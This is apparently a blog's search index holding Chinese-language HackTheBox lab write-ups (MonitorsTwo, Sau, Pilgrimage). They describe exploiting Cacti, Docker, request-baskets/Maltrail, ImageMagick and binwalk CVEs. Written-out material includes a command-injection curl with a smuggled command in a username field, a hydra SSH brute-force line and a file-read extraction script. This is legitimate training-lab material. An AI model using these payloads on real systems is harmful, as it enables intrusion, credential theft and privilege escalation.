<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>MonitorsTwo - HackTheBox</title>
    <link href="/2023/07/16/MonitorsTwo-HackTheBox/"/>
    <url>/2023/07/16/MonitorsTwo-HackTheBox/</url>
    
    <content type="html"><![CDATA[<p>端口还没扫完，直接浏览器访问一下，Google一搜，RCE</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_Q6F88cIx3M.png" alt=""></p><h3 id="CVE-2022-46169-CACTI-1-2-22"><a href="#CVE-2022-46169-CACTI-1-2-22" class="headerlink" title="CVE-2022-46169-CACTI-1.2.22"></a>CVE-2022-46169-CACTI-1.2.22</h3><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_vlWca8mr7s.png" alt=""></p><p>直接拿下</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_bnxOO6aQgw.png" alt=""></p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_NQThyjlhnm.png" alt=""></p><h3 id="Get-User-Flag"><a href="#Get-User-Flag" class="headerlink" title="Get User Flag"></a>Get User Flag</h3><p>但是www-data用户连家目录都无，这里没有找到user flag</p><p>直接上Linpeas 收集一下信息，发现了一个脚本 <code>entrypoint.sh</code>和两个数据库密码</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_t7OuKTMMe5.png" alt=""></p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_JNh6xed6cX.png" alt=""></p><p>这里也是一个连接数据库的脚本，倒是发现了有个host为db的数据库</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_9IMi2gGAqP.png" alt=""></p><p>db的地址找不到，不过有个<code>172.19.0.3</code>，我们可以尝试连接</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_8zDCX02DIY.png" alt=""></p><p>结果就是失败了</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_8i6wujwPhZ.png" alt=""></p><p>这里是在没办法了，去网上找了一下writeup，发现大伙使用 <code>getent</code>发现的数据库地址</p><blockquote><p><code>getent</code> 命令用来查看系统的数据库中的相关记录。即使这些数据库不是在本地，比如 ldap 或者 nis 中的数据库，也可以使用 getent 查看。</p></blockquote><h4 id="Docker-逃逸"><a href="#Docker-逃逸" class="headerlink" title="Docker 逃逸"></a>Docker 逃逸</h4><p>登录MySQL成功，本来想在mysql.user里面查信息的，结果Password这一列直接被删。于是转战cacti</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_H3B7f1i3PQ.png" alt=""></p><p>使用john爆破一下，得出明文密码</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_MBtQQHdVmg.png" alt=""></p><p>拿下User Flag</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_xhl4G00v7d.png" alt=""></p><h3 id="Get-Root-Flag"><a href="#Get-Root-Flag" class="headerlink" title="Get Root Flag"></a>Get Root Flag</h3><p>SUID和sudo看了一下是没有了，直接上linpeas再查查</p><p>倒是发现了个at提权漏洞</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_ggdaCi7uMz.png" alt=""></p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_gMjX2tx9ck.png" alt=""></p><p>结果环境里就没有安装gcc…</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_E2jbbHVlqA.png" alt=""></p><p>又在linpeas里面翻了很久，根据里面的信息可以察觉到这里和CACTI（上面那个Shell）应该是两个机器，根据进程信息可以判断这边应该跑着Docker，CACTI可能就是个容器</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_Wz-LAKfkiI.png" alt=""></p><p>于是查一下Docker版本看看有没有nday</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_s1KagKh6AJ.png" alt=""></p><p>还真有，该漏洞允许非特权Linux用户访问和运行容器内的程序。</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_7P_NAmATET.png" alt=""></p><p>找到EXP直接开冲：<a href="https://github.com/UncleJ4ck/CVE-2021-41091" title="https://github.com/UncleJ4ck/CVE-2021-41091">https://github.com/UncleJ4ck/CVE-2021-41091</a></p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_8VoeEON5zC.png" alt=""></p><p>但是跑完之后还是没成功嘛，认真看一下，我们需要先在容器内给<code>/bin/bash</code> 加上SUID</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_aQYhSIoU6I.png" alt=""></p><p>又回到CACTI里面提权，SUID这里发现了<code>capsh</code>可以进行提权</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_dRVimB8E8u.png" alt=""></p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_CiVOFKRHht.png" alt=""></p><p>再回去试试</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_zL_9eQzyj8.png" alt=""></p><p>拿下！这台靶机，开局直接送个Shell，我还在想这也太简单了。结果是个Container环境，还得Docker逃逸，整体还是挺有收获的</p>]]></content>
    
    
    
    <tags>
      
      <tag>HackTheBox</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Sau - HackTheBox</title>
    <link href="/2023/07/15/Sau-HackTheBox/"/>
    <url>/2023/07/15/Sau-HackTheBox/</url>
    
    <content type="html"><![CDATA[<p>开局先扫一下，发现只有22和55555端口可以访问</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_VAkKigqcJ4.png" alt=""></p><p>进去直接看到开源项目了都</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_xP0f5_NGN8.png" alt=""></p><p>看介绍这是一个收集HTTP请求并且可以展示和检阅它们的一个简单的Web服务</p><p>看开源项目的时候留意到最新的Release已经是v1.2.3了，按照HackTheBox的套路，一般都是nday（听大佬说的）所以Google查一下有没有可利用的nday</p><p>果然Google一查就有了（CVE-2023-27163）</p><h3 id="GetShell-过程"><a href="#GetShell-过程" class="headerlink" title="GetShell 过程"></a>GetShell 过程</h3><h4 id="CVE-2023-27163"><a href="#CVE-2023-27163" class="headerlink" title="CVE-2023-27163"></a>CVE-2023-27163</h4><p>研究一下找到的POC：<a href="https://github.com/entr0pie/CVE-2023-27163" title="https://github.com/entr0pie/CVE-2023-27163">https://github.com/entr0pie/CVE-2023-27163</a></p><p>这是一个SSRF漏洞，通过这个脚本就能简单的利用</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_BKNxZ6ZdaA.png" alt=""></p><p>我也试一下，确实是可以的</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_G3MypS21zZ.png" alt=""></p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_b4GizETLLm.png" alt=""></p><p>成功了但这样跑POC好像没啥用，还不知道漏洞详细情况，于是找到了关于这个漏洞更详细的介绍：</p><p><a href="https://notes.sjtu.edu.cn/s/MUUhEymt7#" title="https://notes.sjtu.edu.cn/s/MUUhEymt7#">https://notes.sjtu.edu.cn/s/MUUhEymt7#</a></p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_CAbd47AZjs.png" alt=""></p><p>原来就是这个forward_url存在漏洞，根据文章提示，创建完Baskets之后要访问一下才能触发</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_sDuk0s9XMi.png" alt=""></p><p>我也试试看</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_9w8v6vXA6N.png" alt=""></p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_OkJ7I-RTya.png" alt=""></p><p>成功了，但还是不知道能干啥，不过可以发现这里的HTTP Request信息是我的本地浏览器的</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_X8-5u6xQNS.png" alt=""></p><p>这里想破脑袋也找了很多文章，都没找到SSRF无回显在这种情况下有什么用。但是上面的nc监听的消息里发现，其实它会来GET我指定的内容。回想起端口扫描的时候filtered的80和8338端口，我们能不能让服务器去GET这些内容呢？</p><p>这里指定<code>forward_url</code>为<code>127.0.0.1:80</code></p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_57fdSqqUTc.png" alt=""></p><p>结果还是没用…</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_-YgCXLeHOx.png" alt=""></p><p>留意到<code>&quot;proxy_response&quot;: false</code> 试了一下改成<code>true</code>行不行</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_efG6PM5KOq.png" alt=""></p><p>逆天…还真就行了</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_2naG2hEYyk.png" alt=""></p><p>访问一下发现也是个项目，老规矩搜一下nday</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_SnDN41b2J0.png" alt=""></p><h4 id="Maltrail-RCE"><a href="#Maltrail-RCE" class="headerlink" title="Maltrail RCE"></a>Maltrail RCE</h4><p>这东西没有申请CVE，exploitdb搜不到，不过Google查到了</p><p><a href="https://huntr.dev/bounties/be3c5204-fbd9-448d-b97c-96a8d2941e87/" title="https://huntr.dev/bounties/be3c5204-fbd9-448d-b97c-96a8d2941e87/">https://huntr.dev/bounties/be3c5204-fbd9-448d-b97c-96a8d2941e87/</a></p><p>文章里表示这样就能执行命令了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl <span class="hljs-string">&#x27;http://hostname:8338/login&#x27;</span> \<br>  --data <span class="hljs-string">&#x27;username=;`id &gt; /tmp/bbq`&#x27;</span><br></code></pre></td></tr></table></figure><p>结合上面的测试，这个服务会把我们的HTTP Request带过去，正好可以通过SSRF打</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_-n4kYto8Q7.png" alt=""></p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_2TA0Pwcolb.png" alt=""></p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_2OZHx8W2HL.png" alt=""></p><h3 id="提权过程"><a href="#提权过程" class="headerlink" title="提权过程"></a>提权过程</h3><p>puma用户可以免密使用sudo执行 <code>/usr/bin/systemctl</code></p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_ccYEP8L9x_.png" alt=""></p><p>根据CTFOBins的指示，我们可以滥用sudo权限提权至root</p><p><a href="https://gtfobins.github.io/gtfobins/systemctl/" title="https://gtfobins.github.io/gtfobins/systemctl/">https://gtfobins.github.io/gtfobins/systemctl/</a></p><p>这里先搞个bash好操作一些</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ script /dev/null /bin/bash<br></code></pre></td></tr></table></figure><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_mTATfJvJ7l.png" alt=""></p><p>拿下！但是感觉SSRF那里真的有点需要脑洞了，不太友好。提权部分还挺简单。</p>]]></content>
    
    
    
    <tags>
      
      <tag>HackTheBox</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Pilgrimage - HackTheBox</title>
    <link href="/2023/07/15/Pilgrimage-HackTheBox/"/>
    <url>/2023/07/15/Pilgrimage-HackTheBox/</url>
    
    <content type="html"><![CDATA[<p>Noob 的 HackTheBox 之旅</p><h3 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h3><p>VPS：43.134.44.115</p><p>Mac：localhost</p><p>Burpsuite</p><h3 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h3><ol><li>VPS通过OpenVPN连接HacktheBox</li><li>Mac通过端口转发将7080端口转发到VPS<br><code>ssh -qTfnN -D 7080 user@43.134.44.115</code></li><li>浏览器通过Burpsuite 将数据代理到7080端口</li></ol><p>这样就可以在本地的浏览器上通过Burpsuite流畅的测HacktheBox的靶机了</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2023-07-14%2017.40.38_0Z6PAL7BFH.png" alt=""></p><h3 id="getShell过程"><a href="#getShell过程" class="headerlink" title="getShell过程"></a>getShell过程</h3><p>先体验一下功能，从PHPSESSID看后端语言应该是PHP</p><h4 id="上传功能"><a href="#上传功能" class="headerlink" title="上传功能"></a>上传功能</h4><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2023-07-14%2017.47.17_kohrftGCRO.png" alt=""></p><p>试了一下就算上传PHP后缀也会被处理成jpeg文件</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2023-07-14%2017.48.22_uiGRMegOtP.png" alt=""></p><h4 id="登录注册功能"><a href="#登录注册功能" class="headerlink" title="登录注册功能"></a>登录注册功能</h4><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2023-07-14%2017.51.25_Y2DHrHU3jp.png" alt=""></p><h4 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h4><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2023-07-14%2017.52.38_j7X0NQnfse.png" alt=""></p><p>发现git泄漏，使用GitHack下载项目代码</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2023-07-14%2017.54.49_jdE_HMMt8T.png" alt=""></p><h4 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h4><p>打包代码下载到本地进行代码审计</p><p><code>tar -zcvf pilgrimage.zip pilgrimage.htb</code></p><p>登录和注册功能两个参数都使用了预编译，注入无望</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2023-07-14%2019.22.33_ptkVK9pfwc.png" alt=""></p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2023-07-14%2019.23.08_mT42LgcO03.png" alt=""></p><p>上传功能这里使用了magick去处理图片，并且会将后缀名设置成jpeg和png。上传无望</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2023-07-14%2019.26.17__e5mG9nXJ_.png" alt=""></p><p>imagemagick这东西之前有著名的RCE漏洞，而且git泄漏这里还有magick这个文件。这里会不会存在nday呢</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2023-07-14%2019.33.59_lpO2xVC0d1.png" alt=""></p><p>通过执行命令查到版本号，我们可以去exploitdb查一下有没有可利用的nday</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_guPmAiygOf.png" alt=""></p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2023-07-14%2019.43.08_FWb7QWQS85.png" alt=""></p><p>有个任意文件读取可以用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs 纯文本"># Exploit Title: ImageMagick  7.1.0-49 - Arbitrary File Read<br># Google Dork: N/A<br># Date: 06/02/2023<br># Exploit Author: Cristian &#x27;void&#x27; Giustini<br># Vendor Homepage: https://imagemagick.org/<br># Software Link: https://imagemagick.org/<br># Version: &lt;= 7.1.0-49<br># Tested on: 7.1.0-49 and 6.9.11-60<br># CVE : CVE-2022-44268 (CVE Owner: Metabase Q Team<br>https://www.metabaseq.com/imagemagick-zero-days/)<br># Exploit pre-requirements: Rust<br><br><br># PoC : https://github.com/voidz0r/CVE-2022-44268<br></code></pre></td></tr></table></figure><h4 id="CVE-2022-44268"><a href="#CVE-2022-44268" class="headerlink" title="CVE-2022-44268"></a>CVE-2022-44268</h4><p>研究下POC的用法：</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2023-07-14%2019.47.01_l39CB6Z4lT.png" alt=""></p><p>先通过项目给的工具指定要读取的文件，然后将生成image.png交给imageMagick处理，这一步交给存在漏洞的Web服务器去触发漏洞读取指定文件，然后将图片下载回来使用identify输出读取到的文件内容</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_7Ty3jJ8z8q.png" alt=""></p><p><code>identify -verbose oout.png</code></p><p>输出读取到的内容</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_oag5we8Y1F.png" alt=""></p><p>这里就获取到了 /etc/passwd 文件内容</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_My0Ds4YEh3.png" alt=""></p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_x5M4BI1MNE.png" alt=""></p><p>只有emily和root用户是可以登录到bash的</p><p>这里想到尝试一下爆破，直接爆破root应该不可能，但可以试一下emily</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">hydra -l emily -P /usr/share/wordlists/SecLists/Passwords/xato-net-10-million-passwords-10000.txt ssh://10.10.11.219 -t 4<br></code></pre></td></tr></table></figure><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_EI3NuikA9X.png" alt=""></p><p>然后发现好像不太适合，爆破速度特别慢。想了一下公共靶机应该也不希望用户一起爆破</p><p>那还是回到任意文件读取这个漏洞吧</p><p>写个脚本简化流程，研究了一下identify命令。如果只需要Raw profile type部分的内容，需要执行：</p><p><code>identify  -format &quot;%[Raw profile type]&quot; -verbose oout.png</code></p><p>链接：<a href="https://www.imagemagick.org/script/escape.php" title="https://www.imagemagick.org/script/escape.php">https://www.imagemagick.org/script/escape.php</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs bash">import sys<br>import requests<br>import subprocess<br><br>def run_identify(image_path):<br>    <span class="hljs-built_in">command</span> = [<span class="hljs-string">&#x27;identify&#x27;</span>, <span class="hljs-string">&#x27;-format&#x27;</span>, <span class="hljs-string">&#x27;%[Raw profile type]&#x27;</span>, <span class="hljs-string">&#x27;-verbose&#x27;</span>, image_path]<br>    <br>    try:<br>        output = subprocess.check_output(<span class="hljs-built_in">command</span>, stderr=subprocess.STDOUT, universal_newlines=True)<br>        <span class="hljs-comment">#这里[10:-8]是为了除去1473和verbose等无效数据</span><br>        <span class="hljs-built_in">print</span>(bytes.fromhex(output[10:]))<br>    <br>    except subprocess.CalledProcessError as e:<br>        <span class="hljs-built_in">print</span>(e.output)<br><br>def download_image(url, path):<br>    try:<br>        response = requests.get(url)<br>        response.raise_for_status()<br>        with open(path, <span class="hljs-string">&#x27;wb&#x27;</span>) as file:<br>            file.write(response.content)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;图片下载成功&#x27;</span>)<br>    except requests.exceptions.RequestException as e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;图片下载失败:&#x27;</span>, str(e))<br><br><br><br><span class="hljs-keyword">if</span> len(sys.argv) &lt; 2:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;请提供图片路径作为参数&#x27;</span>)<br><span class="hljs-keyword">else</span>:<br>    image_path = sys.argv[1]<br>    url = sys.argv[2]<br>    download_image(url, image_path)<br>    run_identify(image_path)<br></code></pre></td></tr></table></figure><p>但这里又不知道应该读哪些文件好了，想了挺久会想起Web服务用的是sqlite的数据库。我们可以把sqlite数据库文件读取，看看数据里面能不能发现什么</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_CRWqLejbJU.png" alt=""></p><p>下载数据库文件</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_BV8rRtBuYs.png" alt=""></p><p>用命令将文件保存后处理一下，主要是删除无用字符（b’）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">python identify.py out.png http://pilgrimage.htb/shrunk/64b1faf7e3216.png &gt; sqli.db<br><span class="hljs-comment"># 从16进制转为二进制文件</span><br><span class="hljs-built_in">cat</span> sqli.db | xxd -r -p &gt; sqlite.db<br><br>-r 表示要进行逆向转换，从十六进制转换为二进制<br>-p 表示输入的十六进制数据是连续的，没有空格或其他字符分隔<br><br></code></pre></td></tr></table></figure><p>学习一下sqlite命令：<a href="https://www.runoob.com/sqlite/sqlite-commands.html" title="https://www.runoob.com/sqlite/sqlite-commands.html">https://www.runoob.com/sqlite/sqlite-commands.html</a></p><p>从数据库中可以查到用户emily和密码，emily之前在 /etc/passwd文件里见到过了，我直接ssh</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_iTfAwExvk4.png" alt=""></p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_BBjGnqlCT8.png" alt=""></p><p>登录成功，是个普通用户，拿到了user.txt 中的user flag。下一步提权</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_Nhu_Ax6Ay2.png" alt=""></p><h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>内核很新，sudo和SUID也没发现可利用的</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_Zfg4pZC7_X.png" alt=""></p><p>直接上提权脚本看看，先看看查CVE的linux-exploit-suggester。对比一下内核版本，没一个靠谱的…</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_HM0wzNqmPf.png" alt=""></p><p>再看看PEASS，这个脚本集成了非常多Linux提权脚本</p><p>在观察进程的时候发现root运行了malwarescan.sh脚本</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_TNR96o0YdF.png" alt=""></p><p>看看脚本里都是什么内容：</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_21Q1F8iW4m.png" alt=""></p><p>通过inotifywait创建了一个关于<code>/var/www/pilgrimage.htb/shrunk/</code> 的监控，使用binwalk提取文件内容。看起来像是个简单的WAF，不允许文件内存在blacklist中的字符串</p><p>binwalk也有个著名的RCE漏洞（CVE-2022-4510），看看版本正好可以使用，美滋滋</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_zd12AgkHVi.png" alt=""></p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_MtbG9AW8TR.png" alt=""></p><p>输入参数运行脚本，就会生成binwalk_exploit.png，再上传到<code>var/www/pilgrimage.htb/shrunk/</code>目录让root运行binwalk触发即可</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_ttjUd88fZV.png" alt=""></p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_z2qffOyWtE.png" alt=""></p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_YSwZYSA_-S.png" alt=""></p><p>拿下！从Noob进化成Script Kiddie</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image__V0QBNzAgu.png" alt=""></p>]]></content>
    
    
    
    <tags>
      
      <tag>HackTheBox</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Remake</title>
    <link href="/2023/07/13/Remake/"/>
    <url>/2023/07/13/Remake/</url>
    
    <content type="html"><![CDATA[<p>Remake…</p>]]></content>
    
    
    
    <tags>
      
      <tag>Remake</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
